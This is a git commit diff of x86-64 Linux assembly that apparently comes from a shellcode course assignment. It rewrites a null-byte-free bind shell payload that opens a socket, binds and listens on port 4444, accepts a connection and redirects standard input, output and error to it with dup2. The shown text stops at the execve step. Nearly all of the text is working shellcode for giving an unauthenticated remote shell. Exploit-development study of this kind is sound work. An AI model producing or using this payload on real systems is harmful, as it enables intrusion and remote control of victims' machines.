e1568874eb6efd4873a15e8cb0c62d4ac2a4345b
Sebastian Feldmann <sebastian.feldmann.hb@web.de>
2018-07-14 15:30:15 -0400

    Redo class

--- Assignment1/BindShellClassNullFree.asm
+++ Assignment1/BindShellClassNullFree.asm
@@ -1,6 +1,5 @@
 global _start
 
-
 _start:
 
 	; sock = socket(AF_INET, SOCK_STREAM, 0)
@@ -8,60 +7,50 @@ _start:
 	; SOCK_STREAM = 1
 	; syscall number 41 
 
-    ; first set rax to 0
-    ; then move the rax to the respective registers to ensure they are zeroed
-    xor rax,rax
-    mov rdi, rax
-    mov rsi, rax
-    mov rdx, rax
-    add rdi, 2
-    add rsi, 1
-    add rax, 41
+    push 41
+    pop rax
+    push 2
+    pop rdi
+    push 1
+    pop rsi
+    cdq
 	syscall
 
 	; copy socket descriptor to rdi for future use 
-
 	mov rdi, rax
+
 
 	; server.sin_family = AF_INET 
 	; server.sin_port = htons(PORT)
 	; server.sin_addr.s_addr = INADDR_ANY
 	; bzero(&server.sin_zero, 8)
 
-	xor rax, rax 
-
-	push rax
-
-	mov dword [rsp-4], eax
-	mov word [rsp-6], 0x5c11
-
-    ; Get rid of nullbyte by making use of al
-    xor rax, rax
-    add al, 2
-	mov byte [rsp-8], al 
-	sub rsp, 8
-
+    push rdx
+    push rdx
+    mov byte [rsp], 2
+    mov word [rsp + 2], 0x5c11
+    push rsp
+    pop rsi
 
 	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
 	; syscall number 49
 
-    xor rax, rax
-	add rax, 49
+    push 49
+    pop rax
 	
 	mov rsi, rsp
-    ; Getting rid of nullbyte by xoring rdx and adding 16
-    xor rdx, rdx
-    add rdx, 16
+    push 16
+    pop rdx
 	syscall
 
 
 	; listen(sock, MAX_CLIENTS)
 	; syscall number 50
 
-    xor rax, rax
-    mov rsi, rax
-    add rax, 50
-    add rsi, 2
+    push 50
+    pop rax
+    push 2
+    pop rsi
 	syscall
 
 
@@ -69,8 +58,8 @@ _start:
 	; syscall number 43
 
 	
-    xor rax, rax
-    add rax, 43
+    push 43
+    pop rax
 	sub rsp, 16
 	mov rsi, rsp
         mov byte [rsp-1], 16
@@ -84,30 +73,32 @@ _start:
 
         ; close parent
 
-        xor rax, rax
-        add rax, 3
+        push 3
+        pop rax
         syscall
 
         ; duplicate sockets
 
         ; dup2 (new, old)
         mov rdi, r9
-        xor rax, rax
-        add rax, 33
+        push 33
+        pop rax
         xor rsi, rsi
         syscall
 
-        xor rax, rax
-        add rax, 33
-        xor rsi, rsi
-        inc rsi
+        push 33
+        pop rax
+        push 1
+        pop rsi
         syscall
 
-        xor rax, rax
-        add rax, 33
-        xor rsi, rsi
-        add rsi, 2
+        push 33
+        pop rax
+        push 2
+        pop rsi
         syscall
+
+
 
         ; execve
 
